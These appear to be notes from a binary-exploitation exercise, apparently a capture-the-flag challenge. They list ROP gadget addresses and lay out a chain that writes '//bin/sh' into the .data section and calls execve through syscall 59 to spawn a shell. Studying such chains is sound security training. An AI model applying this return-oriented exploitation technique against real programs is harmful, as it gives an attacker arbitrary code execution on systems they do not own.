Helpful gadgets

Write-what-where:
0x000000000048d342 : mov dword ptr [rax], edx ; ret (Note: Only moves edx, NOT rdx)
0x00000000004156f4 : pop rax ; ret
0x00000000004499b5 : pop rdx ; ret

Argument setup:
0x0000000000400686 : pop rdi ; ret
0x00000000004100d3 : pop rsi ; ret

Syscall:
0x000000000040123c : syscall

Goal: execve("//bin/sh", NULL, NULL)
Syscall # = 59

Call syscall using syscall, NOT int 0x80!

RAX = Syscall #
Arguments go in RDI, RSI, RDX

RAX: 59 = 0x3b
RDI: pointer to "//bin/sh"
RSI: NULL (0x0000000000000000)
RDX: NULL (0x0000000000000000)

Data starts at 0x6b90e0

-------------------------------------------------------------------

Assembly code

# Writing required data

# pop rax = 0x6b90e0 (.data)
# pop rdx = 0x0000000069622f2f ("//bi")
# mov dword ptr [rax], edx
# pop rax = 0x6b90e4 (.data+4)
# pop rdx = 0x0000000068732f6e ("n/sh")
# mov dword ptr [rax], edx
# pop rax = 0x6b90e8 (.data+8)
# pop rdx = 0x0000000000000000 (NULL)
# mov dword ptr [rax], edx

# Moving arguments in

# pop rax = 0x000000000000003b (59)
# pop rdi = 0x6b90e0 (.data)
# pop rsi = 0x6b90e8 (.data+8)
# pop rdx = 0x6b90e8 (.data+8)

# Syscall

# syscall